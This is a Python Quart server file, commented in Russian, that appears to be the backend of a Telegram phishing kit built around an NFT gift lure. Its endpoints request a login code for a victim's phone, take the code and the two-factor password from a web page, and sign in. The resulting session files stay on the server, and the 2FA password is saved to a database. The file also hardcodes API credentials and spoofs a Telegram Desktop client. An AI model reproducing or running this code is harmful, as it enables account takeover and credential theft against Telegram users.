import os
import httpx
from bs4 import BeautifulSoup
from typing import Optional, Dict
from telethon import TelegramClient
from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    AuthKeyError,
    FloodWaitError,
    RPCError,
)
from quart import Quart, request, jsonify
from db_func import *
from telethon.tl.types.auth import SentCodeTypeSetUpEmailRequired

app = Quart(__name__)

# API Configuration
API_ID = 27588553     
API_HASH = "3757d561b61acdef227dac5ebfb9173f"

# Sessions storage
SESSION_DIR = "./sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

# Хранилище для phone_code_hash (в памяти)
# В продакшене лучше использовать Redis или базу данных
phone_code_hashes: Dict[int, str] = {}


async def get_client(
    phone: str,
    api_id: int,
    api_hash: str,
) -> TelegramClient:
    """
    Создает и возвращает TelegramClient с валидацией и логированием.
    
    :param phone: Номер телефона пользователя (используется для имени файла сессии).
    :param api_id: ID API Telegram.
    :param api_hash: Хэш API Telegram.
    :return: Экземпляр TelegramClient
    :raises ValueError: Если переданы некорректные данные.
    :raises ConnectionError: Если не удалось подключиться к Telegram.
    """
    
    # Приводим phone к строке если это не строка
    if phone is not None:
        phone = str(phone)
    
    if not phone or not isinstance(phone, str) or phone.strip() == "":
        raise ValueError("Phone number must be a non-empty string.")
    
    if not api_id or not isinstance(api_id, int):
        raise ValueError("API_ID must be a valid integer.")
    
    if not api_hash or not isinstance(api_hash, str):
        raise ValueError("API_HASH must be a valid string.")
    
    session_path = os.path.join(SESSION_DIR, f"{phone}.session")
    
    try:
        client = TelegramClient(
            session=session_path,
            api_id=api_id,
            api_hash=api_hash,
            device_model="PC",
            system_version="Windows 11",
            app_version="Telegram Desktop 6.3.4",
            lang_code="en",
            system_lang_code="en-US"
        )
        
        await client.connect()
        
        if not client.is_connected():
            raise ConnectionError("Unable to connect to Telegram servers.")
        
        return client
        
    except AuthKeyError as e:
        raise ValueError("Invalid session file. Please re-authenticate.")
    
    except FloodWaitError as e:
        raise ConnectionError(f"Telegram blocked the request. Retry after {e.seconds} seconds.")
    
    except RPCError as e:
        raise ConnectionError(f"Telegram API error: {e}")
    
    except Exception as e:
        raise ConnectionError(f"Failed to create Telegram client: {e}")


async def get_client_for_user(user_id: int) -> TelegramClient:
    """
    Получает клиент для существующего пользователя.
    
    :param user_id: ID пользователя.
    :return: Экземпляр TelegramClient.
    """
    phone = await get_num_from_id(user_id)
    
    if not phone:
        raise ValueError(f"Phone not found for user_id: {user_id}")
    
    
    # Убедимся что phone это строка
    phone = str(phone)
    
    return await get_client(phone, API_ID, API_HASH)


async def get_fresh_client(user_id: int) -> TelegramClient:
    """
    Создает новый клиент с удалением старой сессии.
    
    :param user_id: ID пользователя.
    :return: Экземпляр TelegramClient.
    """
    phone = await get_num_from_id(user_id)
    
    if not phone:
        raise ValueError(f"Phone not found for user_id: {user_id}")
    
    
    # Убедимся что phone это строка
    phone = str(phone)
    
    session_file = os.path.join(SESSION_DIR, f"{phone}.session")
    
    try:
        if os.path.exists(session_file):
            os.remove(session_file)

    except Exception as e:
        print(e)
    return await get_client(phone, API_ID, API_HASH)


def clean_name(name: Optional[str]) -> Optional[str]:
    """
    Очищает имя от номеров после #.
    
    :param name: Исходное имя.
    :return: Очищенное имя.
    """
    if not name:
        return name
    
    if "#" in name:
        parts = name.rsplit("#", 1)
        if len(parts) == 2 and parts[1].strip().isdigit():
            return parts[0].strip()
    
    return name


@app.after_request
def add_cors_headers(response):
    """Добавляет CORS заголовки к каждому ответу."""
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return response


async def parse_telegram_nft(collection: str, gift_id: int) -> dict:
    """
    Парсит информацию о NFT из Telegram.
    
    :param collection: Название коллекции.
    :param gift_id: ID подарка.
    :return: Словарь с данными NFT.
    """
    url = f"https://t.me/nft/{collection}-{gift_id}"
    
    try:
        async with httpx.AsyncClient() as client:
            r = await client.get(url, timeout=10)
    except Exception as e:
        return {"error": f"Request failed: {e}"}
    
    if r.status_code != 200:
        return {"error": f"Telegram returned status {r.status_code}"}
    
    soup = BeautifulSoup(r.text, "html.parser")
    
    # Парсинг имени
    name = None
    el = soup.find("meta", property="og:title")
    if el:
        name_raw = el.get("content")
        name = clean_name(name_raw)
    
    # Парсинг изображения
    image_url = None
    img_el = soup.find("meta", property="og:image")
    if img_el:
        image_url = img_el.get("content")
    
    # Парсинг атрибутов
    attributes = []
    props = soup.find_all("div")
    for div in props:
        txt = div.get_text(strip=True)
        if ":" in txt and len(txt) < 100:
            parts = txt.split(":", 1)
            if len(parts) == 2:
                attributes.append({
                    "trait_type": parts[0].strip(),
                    "value": parts[1].strip()
                })
    
    return {
        "url": url,
        "name": name,
        "image": image_url,
        "attributes": attributes
    }


@app.route("/api/nft")
async def api_nft():
    """Возвращает случайный NFT из базы данных."""
    try:
        row = await get_random_row()
        if not row:
            return jsonify({"error": "No rows"}), 404
        
        tg = await parse_telegram_nft(row["collection"], row["gift_id"])
        
        response = {
            "collection": row["collection"],
            "gift_id": row["gift_id"],
            "price": row["price"],
            "url": tg.get("url"),
            "name": tg.get("name"),
            "image": tg.get("image"),
            "attributes": tg.get("attributes", [])
        }
        
        return jsonify(response)
        
    except Exception as e:
        return jsonify({"error": "Internal server error"}), 500


@app.route("/api/phone", methods=["POST"])
async def api_phone():
    """Отправляет код подтверждения на телефон пользователя."""
    try:
        data = await request.get_json()
        user_id = data.get("user_id")
        
        if not user_id:
            return jsonify({"ok": False, "error": "missing user_id"}), 400
        
        phone = await get_num_from_id(user_id)
        if not phone:
            return jsonify({"ok": False, "error": "phone not found"}), 404
        
        phone = str(phone)
        
        client = await get_fresh_client(user_id)
        sent_code = await client.send_code_request(phone)
        
        # ВАЖНО: Сохраняем phone_code_hash для использования в /api/send_code
        phone_code_hashes[user_id] = sent_code.phone_code_hash
        
        return jsonify({"ok": True})
        
    except ValueError as e:
        return jsonify({"ok": False, "error": str(e)}), 400
        
    except ConnectionError as e:
        return jsonify({"ok": False, "error": str(e)}), 503
        
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 400


@app.route("/api/send_code", methods=["POST", "OPTIONS"])
async def api_code():
    """Проверяет код подтверждения."""
    if request.method == "OPTIONS":
        return {}, 200
    
    try:
        data = await request.get_json()
        user_id = data.get("user_id")
        code = data.get("code")
        print(code)
        print(phone_code_hashes[user_id])
        
        if not user_id or not code:
            return jsonify({"ok": False, "error": "missing user_id or code"}), 400
        
        # Проверяем наличие сохраненного phone_code_hash
        if user_id not in phone_code_hashes:
            return jsonify({"ok": False, "error": "phone_code_hash not found, please request code first"}), 400
        
        phone_code_hash = phone_code_hashes[user_id]
        
        client = await get_client_for_user(user_id)
        phone = await get_num_from_id(user_id)
        phone = str(phone)
        
        try:
            # Передаем phone_code_hash при входе
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            
            # Удаляем использованный хэш
            del phone_code_hashes[user_id]
            
            return jsonify({"ok": True, "2fa": False})
            
        except SessionPasswordNeededError:
            # НЕ удаляем хэш, он может понадобиться
            return jsonify({"ok": True, "2fa": True})
            
        except PhoneCodeInvalidError:
            return jsonify({"ok": False, "error": "invalid code"})
            
    except ValueError as e:
        return jsonify({"ok": False, "error": str(e)}), 400
        
    except ConnectionError as e:
        return jsonify({"ok": False, "error": str(e)}), 503
        
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 400


@app.route("/api/2fa", methods=["POST"])
async def api_2fa():
    """Проверяет пароль двухфакторной аутентификации."""
    try:
        data = await request.get_json()
        user_id = data.get("user_id")
        password = data.get("password")
        
        if not user_id or not password:
            return jsonify({"ok": False, "error": "missing user_id or password"}), 400
        
        client = await get_client_for_user(user_id)
        await client.sign_in(password=password)
        await put_2fa_in_user(user_id, password)
        
        # Удаляем использованный phone_code_hash
        if user_id in phone_code_hashes:
            del phone_code_hashes[user_id]
        
        return jsonify({"ok": True})
        
    except ValueError as e:
        return jsonify({"ok": False, "error": str(e)}), 400
        
    except ConnectionError as e:
        return jsonify({"ok": False, "error": str(e)}), 503
        
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 400


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)